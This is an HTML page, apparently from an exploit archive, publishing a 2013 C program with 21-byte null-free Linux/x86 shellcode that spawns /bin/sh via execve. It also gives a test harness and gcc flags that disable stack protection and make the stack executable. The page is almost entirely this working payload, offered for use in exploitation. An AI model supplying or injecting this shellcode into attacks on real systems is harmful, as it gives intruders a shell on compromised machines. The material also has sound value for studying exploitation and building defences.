<html><head><title>Linux/x86 - Tiny Execve sh Shellcode - 21 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*

 Tiny Execve sh Shellcode - C Language - Linux/x86
 Copyright (C) 2013 Geyslan G. Bem, Hacking bits

   http://hackingbits.com
   geyslan@gmail.com

 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation, either version 3 of the License, or
 (at your option) any later version.

 This program is distributed in the hope that it will be useful,
 but WITHOUT ANY WARRANTY; without even the implied warranty of
 MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 GNU General Public License for more details.

 You should have received a copy of the GNU General Public License
 along with this program.  If not, see &lt;http://www.gnu.org/licenses/&gt;

*/

/*

   tiny_execve_sh_shellcode

  * 21 bytes
  * null-free


   # gcc -m32 -fno-stack-protector -z execstack tiny_execve_sh_shellcode.c -o tiny_execve_sh_shellcode

   Testing
   # ./tiny_execve_sh_shellcode

*/


#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

unsigned char shellcode[] = \

"\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f"
"\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd"
"\x80";


main ()
{

        // When contains null bytes, printf will show a wrong shellcode length.

	printf("Shellcode Length:  %d\n", strlen(shellcode));

	// Pollutes all registers ensuring that the shellcode runs in any circumstance.

	__asm__ ("movl $0xffffffff, %eax\n\t"
		 "movl %eax, %ebx\n\t"
		 "movl %eax, %ecx\n\t"
		 "movl %eax, %edx\n\t"
		 "movl %eax, %esi\n\t"
		 "movl %eax, %edi\n\t"
		 "movl %eax, %ebp\n\t"

		 // Calling the shellcode
		 "call shellcode");

}

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
